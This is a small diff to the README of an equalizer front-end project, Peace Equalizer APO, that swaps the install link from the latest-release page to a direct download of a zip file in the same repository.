@@ -15,7 +15,7 @@ Peace Equalizer APO is a modern and user-friendly graphical interface for Equali
 > This project is for educational and personal use only. Use at your own risk. You must install Equalizer APO first. The authors are not responsible for any audio issues or system changes.
 
 ## Install
-[Download `Peace-Equalizer-APO.zip`](https://github.com/MoradAmr14/Peace-Equalizer-Apo/releases/latest)
+[Download `Peace-Equalizer-APO.zip`](https://github.com/MoradAmr14/Peace-Equalizer-Apo/releases/download/Equalizer/PeaceEQ.zip)
 ---
 > Optimized for Windows 11.
 
